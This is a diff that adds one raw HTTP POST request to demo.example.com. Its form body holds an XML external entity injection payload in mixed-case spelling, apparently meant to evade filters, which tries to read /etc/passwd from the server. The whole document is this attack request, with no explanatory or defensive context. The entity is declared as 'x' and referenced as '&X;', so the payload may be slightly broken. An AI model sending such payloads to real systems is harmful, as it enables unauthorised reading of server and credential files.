@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Connection: close
+
+page=<!dOcTyPe R [<!eNtItY x PuBlIc "-//X//y" "FiLe:///EtC/pAsSwD">]><r>&X;</r>
